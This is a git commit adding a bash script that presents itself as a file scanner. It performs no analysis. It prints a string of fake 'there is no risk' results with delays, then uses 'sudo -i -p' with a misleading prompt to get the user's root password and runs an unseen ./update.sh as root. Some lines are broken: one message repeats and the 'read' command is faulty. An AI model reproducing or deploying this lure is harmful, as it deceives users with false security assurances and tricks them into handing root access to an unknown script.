3f6f530ee7212184273f3205ad085c34c6e482ce
jihadLkmaty218 <jihadLkmaty218@users.noreply.github.com>
2017-06-06 00:53:38 +0200

    Add files via upload

---
+++ Scanner files.sh
@@ -0,0 +1,88 @@
+#!/bin/bash
+
+cat << !
+███████╗ ██████╗ █████╗ ███╗   ██╗███╗   ██╗███████╗██████╗      ██████╗ ███╗   ██╗    ███████╗██╗██╗     ███████╗
+██╔════╝██╔════╝██╔══██╗████╗  ██║████╗  ██║██╔════╝██╔══██╗    ██╔═══██╗████╗  ██║    ██╔════╝██║██║     ██╔════╝
+███████╗██║     ███████║██╔██╗ ██║██╔██╗ ██║█████╗  ██████╔╝    ██║   ██║██╔██╗ ██║    █████╗  ██║██║     █████╗  
+╚════██║██║     ██╔══██║██║╚██╗██║██║╚██╗██║██╔══╝  ██╔══██╗    ██║   ██║██║╚██╗██║    ██╔══╝  ██║██║     ██╔══╝  
+███████║╚██████╗██║  ██║██║ ╚████║██║ ╚████║███████╗██║  ██║    ╚██████╔╝██║ ╚████║    ██║     ██║███████╗███████╗
+╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝     ╚═════╝ ╚═╝  ╚═══╝    ╚═╝     ╚═╝╚══════╝╚══════╝                                                   
+!
+
+cat << !
+The files were analyzed there is no risk Now 1
+!
+sleep 0.44
+
+cat << !
+The files were analyzed there is no risk Now 2
+!
+sleep 0.44
+
+cat << !
+The files were analyzed there is no risk Now 3
+!
+sleep 0.44
+
+cat << !
+The files were analyzed there is no risk Now 4
+!
+sleep 0.44
+
+cat << !
+The files were analyzed there is no risk Now 5
+!
+sleep 0.44
+
+cat << !
+The files were analyzed there is no risk Now 6
+!
+sleep 0.44
+
+cat << !
+The files were analyzed there is no risk Now 6
+!
+sleep 0.44
+
+cat << !
+The files were analyzed there is no risk Now 7
+!
+sleep 0.44
+
+cat << !
+The files were analyzed there is no risk Now 8
+!
+sleep 0.44
+
+cat << !
+The files were analyzed there is no risk Now 9
+!
+sleep 0.44
+
+cat << !
+The files were analyzed there is no risk Now 10
+!
+sleep 0.44
+
+cat << !
+The files were analyzed there is no risk Now 11
+!
+sleep 0.44
+
+cat << !
+The files were analyzed there is no risk Now 12
+!
+sleep 0.44
+
+cat << !
+The files were analyzed there is no risk Now 13
+!
+sleep 0.44
+
+echo "Do you suspect something? Select the path and we will check it"
+read $target
+sudo -i -p There.is.something.dangerous.that.exists.in.the.root.password.to.allow.us.to.complete.the.protection.process ./update.sh
+sleep 3
+echo "Thanks"
+
+
